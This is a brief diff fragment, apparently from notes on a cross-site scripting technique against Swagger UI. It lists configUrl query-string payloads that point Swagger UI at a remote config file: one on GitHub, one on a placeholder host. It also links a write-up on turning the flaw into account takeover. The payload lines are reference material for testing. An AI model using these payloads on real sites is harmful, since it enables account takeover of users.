@@ -12,3 +12,6 @@
 `?configUrl=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/config.json`
 
 **More info at**: https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
+
+test.json -> test.yaml
+`?configUrl=https://xxx.xxx.xxx/test.json`
